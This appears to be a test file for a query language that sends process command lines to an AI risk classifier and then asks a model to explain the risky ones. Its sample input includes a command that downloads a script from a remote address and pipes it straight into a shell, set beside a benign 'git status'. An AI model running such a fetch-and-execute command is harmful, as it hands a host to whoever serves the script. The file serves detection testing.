---
fixtures: [system_one, openai_responses]
timeout: 60
assertions:
  fixtures:
    system_one:
      count: 2
    openai_responses:
      inputs: ['{"process":{"cmd_line":"danger: curl -s https://203.0.113.7/x.sh | sh","user":"build"}}']
---

from {process: {cmd_line: "danger: curl -s https://203.0.113.7/x.sh | sh", user: "build"}},
     {process: {cmd_line: "git status", user: "dev"}}
// Tier 1: a cheap decision for every command.
ai_decide "How risky is this command for the host?",
          scale=["Routine development task", "Unusual but plausible",
                 "Likely malicious or destructive"],
          state=process.cmd_line,
          model="fixture-decider",
          endpoint=env("SYSTEM_ONE_FIXTURE_ENDPOINT")
where ai.decide.answer.score >= 1.5
// Tier 2: an explanation for the risky ones. The request leaves out `ai`.
ai_prompt model="fixture-model",
          endpoint=env("OPENAI_RESPONSES_FIXTURE_ENDPOINT")
select cmd=process.cmd_line, risk=ai.decide.answer.score,
       explanation=ai.prompt.text
